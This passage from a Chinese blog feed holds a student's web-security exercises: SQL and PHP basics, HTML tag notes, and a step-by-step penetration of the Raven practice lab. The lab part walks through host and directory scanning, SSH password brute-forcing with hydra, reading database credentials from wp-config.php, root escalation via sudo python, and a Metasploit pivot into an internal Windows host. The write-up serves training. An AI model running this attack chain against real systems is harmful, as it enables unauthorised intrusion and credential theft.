id="6、将自己的信息和同桌的信息写入字段，根据id查询自己的信息"><a href="#6、将自己的信息和同桌的信息写入字段，根据id查询自己的信息" class="headerlink" title="6、将自己的信息和同桌的信息写入字段，根据id查询自己的信息"></a>6、将自己的信息和同桌的信息写入字段，根据id查询自己的信息</h4><p>①填入信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into student.user(id,name,tel) value (1,&#x27;tianhengyu&#x27;,13989898989);</span><br></pre></td></tr></table></figure><p>其他信息改变value执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141708777.png"></p><p>成功创建</p><p>②查询数据，根据id</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from student.user where id = 1;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141710181.png"></p><p>成功查询</p><h4 id="7、要求使用select语句查询自己创建的数据库的字段，所属表，所属数据库"><a href="#7、要求使用select语句查询自己创建的数据库的字段，所属表，所属数据库" class="headerlink" title="7、要求使用select语句查询自己创建的数据库的字段，所属表，所属数据库"></a>7、要求使用select语句查询自己创建的数据库的字段，所属表，所属数据库</h4><p>查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select column_name,table_name,table_schema from information_schema.columns;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508141738191.png"></p><p>成功查询到字段，所属的表和所属的库</p><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>使用动态函数和可变变量编写一个后门程序</p><p>已在第4题做出展示</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web练习2</title>
      <link href="/2025/08/12/web%E7%BB%83%E4%B9%A02/"/>
      <url>/2025/08/12/web%E7%BB%83%E4%B9%A02/</url>
      
        <content type="html"><![CDATA[<h3 id="1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格"><a href="#1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格" class="headerlink" title="1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格"></a>1、使用if语句实现如下效果，当成绩在60以上时为及格，60以下时为不及格</h3><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];    <span class="comment">//接受get传参a，赋值给变量$a</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &gt;= <span class="number">60</span>)&#123;       <span class="comment">//判断语句，及格为PASS,不及格为FAIL</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PASS&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;FAIL&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②在url中输入?a&#x3D;64，页面回显PASS</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813161647762.png"></p><p>③在url中输入?a&#x3D;55，页面回显FAIL</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813161815418.png"></p><h3 id="2、使用switch语句实现在浏览器端传递参数，number-1能够显示为一月，以及后续的月份"><a href="#2、使用switch语句实现在浏览器端传递参数，number-1能够显示为一月，以及后续的月份" class="headerlink" title="2、使用switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份"></a>2、使用switch语句实现在浏览器端传递参数，number&#x3D;1能够显示为一月，以及后续的月份</h3><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];   <span class="comment">//接收get传参</span></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$a</span>)&#123;        <span class="comment">//根据收到参数输出月份</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Jan&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Feb&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Mar&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Apr&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;May&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Jun&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Jul&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Aug&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sep&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Oct&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Nov&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Dec&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Plase intput a value&quot;</span>;     <span class="comment">//无参数输入则输出请输入一个值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②在页面随便输入几个月份来验证，如2，4，6</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165451694.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165502827.png"></p><p>③如果没有输入参数的话，验证回显</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165517228.png"></p><h3 id="3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字"><a href="#3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字" class="headerlink" title="3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字"></a>3、使用循环打印1-100的数字，要求当数字为17的整数倍时，不输出当前数字</h3><p>①编写php代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">100</span>;<span class="variable">$i</span>++)&#123;     <span class="comment">//for循环输出1-100</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span> % <span class="number">17</span> == <span class="number">0</span>)&#123;       <span class="comment">//如果是17的整数倍则跳过，使用continue跳过</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;  &quot;</span>;          <span class="comment">//输出空格方便观看</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②上网页验证</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813165210488.png"></p><h3 id="4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路"><a href="#4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路" class="headerlink" title="4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路"></a>4、尝试通关Raven靶场，解释每一步操作的含义，以及当前步骤还可以有哪些渗透思路</h3><p>测试环境</p><table><thead><tr><th>主机</th><th>网卡</th><th>地址</th></tr></thead><tbody><tr><td>kali（攻击机）</td><td>nat</td><td>192.168.18.132</td></tr><tr><td>raven（服务器&#x2F;内网）</td><td>nat&#x2F;vmnet0</td><td>192.168.18.167&#x2F;</td></tr><tr><td>win7（内网主机）</td><td>vmnet0</td><td></td></tr></tbody></table><p>①kali端先扫描本网段下存活的主机</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.18.0/24  <span class="comment">#扫描存活主机</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131836536.png"></p><p>这里我们找到一个192.168.18.167的存活主机，并且有raven标识，推测应该是目标机器，我们去访问一下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131838203.png"></p><p>发现是一个web网站</p><p>再扫描该主机开放端口及服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.18.167</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131851932.png"></p><p>发现开启了关键的一个ssh服务，方便后续利用</p><p>②尝试去爆破一下后台目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.18.167    <span class="comment">#爆破后台，kali自带工具</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131841318.png"></p><p>发现一个疑似后台目录，并且使用的是wordpress开源内容管理系统框架</p><p>③访问后台</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131847443.png"></p><p>成功访问到后台</p><p>④尝试爆破后台目录</p><p>kali自带wpscan工具，专为wordpress设计，可以用来枚举用户</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.18.167/wordpress --wp-content-dir -at -eu</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131900582.png"></p><p>此时我们发现了一个steven用户和michael用户</p><p>此时枚举出用户之后我们就可以尝试去爆破密码，登录后台</p><p>⑤爆破ssh服务</p><p>既然有了账户，我们推测，服务器管理员会不会让系统账户和网站账户使用相同用户名呢</p><p>测试一下去爆破ssh</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#hydra九头蛇是一个强大的爆破工具</span></span><br><span class="line">hydra -l michael -P 1.txt ssh://192.168.18.167</span><br><span class="line">hydra -l steven -P 1.txt ssh://192.168.18.167</span><br><span class="line"></span><br><span class="line">-l指定用户名</span><br><span class="line">-L指定用户名字典</span><br><span class="line">-p指定密码</span><br><span class="line">-P指定密码字典</span><br><span class="line"></span><br><span class="line">我们在当前目前下创建一个密码字典1.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131914743.png"></p><p><img src="C:\Users\thy\AppData\Roaming\Typora\typora-user-images\image-20250813191851279.png" alt="image-20250813191851279"></p><p>我们爆破出来michael账户密码michael，steven账户密码pink84</p><p>⑥ssh连接进行登录</p><p>使用michael账户登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh michael@192.168.18.167</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131925057.png"></p><p>我们成功远程连接到目标主机，接下来就可以开始找我们想要的东西</p><p>查看网站根目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131928849.png"></p><p>我们发现一个flag文件，我们打开看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag2.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131929992.png"></p><p>发现一串字符，如果这是ctf，恭喜你，可以拿去通关了</p><p>我们进入到html这个网站目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /html</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131931726.png"></p><p>发现一个这个网站wordpress根目录，里面肯定有重要信息，进去看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> wordpress</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131933941.png"></p><p>发现一个配置文件，wp-config.php，这个文件通常保存数据库等重要信息，我们打开看看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> wp-config.php</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131936744.png"></p><p>我们发现数据库Mysql的账户密码，看样子还是管理员账户，接下来去登录数据库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131938579.png"></p><p>成功登录数据库，接下来就可以去查看数据库里的账户密码了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131941957.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131942320.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131943997.png"></p><p>我们发现了账户和密码，但是密码是加密过的，一时间不能解密，怎么办呢？？？？</p><p>我们登录的是root用户，当然可以修改密码，我们修改michael的密码，然后去后台登录试试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update wp_users set user_pass=md5(&#x27;Admin123&#x27;) where id=1;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131945248.png"></p><p>成功登录后台！！！！</p><p>⑦ssh登录另一个账户，密码pink84</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh steven@192.168.18.167</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131948512.png"></p><p>成功登录</p><p>⑧查看可用权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l    <span class="comment">#查看当前用户可以使用sudo执行什么文件或者命令</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508131955767.png"></p><p>我们发现可以执行python命令，python是一个强大的解释器，可以用来执行系统命令，因此我们可以使用python进行提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/python -c <span class="string">&#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132000719.png"></p><p>我们成功提权到root用户，等于是拿下了这台机器</p><p>⑨网络嗅探</p><p>拿下一台主机后，可以去查看网络配置情况，是否有其他网卡可以连接内网</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line">或</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132003611.png"></p><p>我们发现两个网卡，第二个网卡应该是通向内网，这里是靶场，所以我们应该去手动开启第二个网卡eth1</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;auto eth1&quot;</span> &gt;&gt; /etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;iface eth1 inet dhcp&quot;</span> &gt;&gt; /etc/network/interfaces</span><br><span class="line">ifconfig eth1 up</span><br><span class="line">systemctl restart networking</span><br><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132038995.png"></p><p>我们查看到第二个网卡的ip，这个ip应该能访问内网</p><p>⑩流量代理</p><p>虽然看见了第二个网卡，但是拿下的服务器上没有攻击工具，并且kali不能访问到内网，所以我们需要做流量代理，将拿下的raven作为跳板</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新开一个终端</span></span><br><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/ssh/ssh_login     <span class="comment">#msf的一个攻击模块</span></span><br><span class="line"><span class="built_in">set</span> username michael</span><br><span class="line"><span class="built_in">set</span> password michael</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.18.167</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132042404.png"></p><p>获取sessions</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions -l</span><br><span class="line">sessions -u 1</span><br><span class="line">sessions -i 2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132044460.png"></p><p>设置自动路由，将目标机器作为跳板</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br><span class="line">background</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132045039.png"></p><p>可以看见我们的kali已经有了一个路由表</p><p>我们需要再启动socks5服务</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132047724.png"></p><p>配置流量客户端工具，启动代理</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132050661.png"></p><p>本来应该是通过nmap继续扫描159网段的存活主机，但是为了避免繁琐操作，直接去远程桌面连接win7，账户是administator，密码123456</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop -u administrator -p 123456 192.168.159.130</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508132057670.png"></p><p>成功连接</p><p>至此，渗透工作完成！！！！</p><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><h3 id="1、使用else-if优化第一题程序，90-100为优秀，80-89良好，60-79及格-60以下不及格，如果数字不在0-100范围之内如何解决"><a href="#1、使用else-if优化第一题程序，90-100为优秀，80-89良好，60-79及格-60以下不及格，如果数字不在0-100范围之内如何解决" class="headerlink" title="1、使用else if优化第一题程序，90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决"></a>1、使用else if优化第一题程序，90-100为优秀，80-89良好，60-79及格,60以下不及格，如果数字不在0-100范围之内如何解决</h3><p>①编写代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];                    <span class="comment">//接收传参   </span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="number">90</span> &amp;&amp; <span class="variable">$a</span>&lt;=<span class="number">100</span>)&#123;               <span class="comment">//分数在90-100，不能以数学的形式来写，如1&lt;a&lt;5</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;best&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="number">80</span> &amp;&amp; <span class="variable">$a</span>&lt;<span class="number">90</span>)&#123;           <span class="comment">//分数在80-89</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;better&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$a</span>&gt;=<span class="number">60</span> &amp;&amp; <span class="variable">$a</span>&lt;<span class="number">80</span>)&#123;           <span class="comment">//分数在60-79</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$a</span> &lt; <span class="number">60</span>)&#123;                   <span class="comment">//分数小于60</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;plase int the score in 0-100&quot;</span>;    <span class="comment">//当输入不合法时</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>②在前端网页验证，输入95，85，70，，50，110（不合法）</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172612046.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172624865.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172622534.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172651706.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250813172659826.png"></p><h3 id="2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路"><a href="#2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路" class="headerlink" title="2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路"></a>2、尝试使用michael用户进行提权，结果不重要，截图体现自己的操作和思路</h3><p>①尝试find寻找可用提权的suid文件，如vim，bash，python，find</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>但是并没有找到可用文件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web练习1</title>
      <link href="/2025/08/11/web%E7%BB%83%E4%B9%A01/"/>
      <url>/2025/08/11/web%E7%BB%83%E4%B9%A01/</url>
      
        <content type="html"><![CDATA[<h1 id="一、h5简介"><a href="#一、h5简介" class="headerlink" title="一、h5简介"></a>一、h5简介</h1><p>HyperTextMarkupLanguage（超文本标记语言），超文本包括：文字、图片、音频、视频、动画等<br>HTML5作为最新版本，提供了一些新的元素和一些有趣的新特性，同时也建立了一些新的规则。这些元素、特性和规则的建立，提供了许多新的网页功能，如使用网页实现动态渲染图形、图表、图像和动画，以及不需要安装任何插件直接使用网页播放视频等。</p><h4 id="1-HTML基本结构"><a href="#1-HTML基本结构" class="headerlink" title="1.HTML基本结构"></a>1.HTML基本结构</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE&gt;</span></span><br><span class="line">声明位于文档中的最前面的位置，处于<span class="tag">&lt;<span class="name">html</span>&gt;</span>标签之前。<span class="meta">&lt;!DOCTYPE&gt;</span>声明不是一个HTML标签；它是用来告知Web浏览器页面使用了哪种HTML版本。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span></span><br><span class="line">设置网页的编码，SEO</span><br><span class="line">&lt;metacharset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;metaname=&quot;keywords&quot;content=&quot;是兄弟就来kan我&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="2-网页的基本标签"><a href="#2-网页的基本标签" class="headerlink" title="2.网页的基本标签"></a>2.网页的基本标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//标题标签</span><br><span class="line">//h1最大，h6最小</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span>X<span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//段落标签</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>yyds<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//换行标签</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">//水平线标签</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">//特殊符号</span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtml&gt;</span></span><br><span class="line">&lt;htmllang=&quot;en&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&lt;metacharset=&quot;UTF-8&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>特殊符号<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--空格--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">yyds<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">yyds<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">yy<span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span>ds<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--大于小于--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;&lt;<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;quot;</span>YUYU<span class="symbol">&amp;quot;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--版权--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span>YUYU</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&amp;符号+xxx--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//图像标签</span><br><span class="line">//常见的图像格式：jpg、gif、png(受浏览器兼容性限制)</span><br><span class="line">&lt;imgsrc=&quot;图片的位置&quot;alt=&quot;图片异常替代文字&quot;title=&quot;鼠标悬停文字&quot;&gt;</span><br><span class="line"></span><br><span class="line">//链接标签</span><br><span class="line">//页面间链接：从一个页面链接到另外一个页面</span><br><span class="line">&lt;ahref=&quot;path&quot;target=&quot;_self&quot;&gt;文本或者图像<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&lt;ahref=&quot;path&quot;target=&quot;_blank&quot;&gt;文本或者图像<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//锚链接</span><br><span class="line">//ctrl+d复制当前行到下一行</span><br><span class="line">&lt;aname=&quot;top&quot;&gt;顶部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">&lt;aherf=&quot;#top&quot;&gt;跳转到顶部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、练习"><a href="#二、练习" class="headerlink" title="二、练习"></a>二、练习</h2><h3 id="1、编写一个html页面，要求如下"><a href="#1、编写一个html页面，要求如下" class="headerlink" 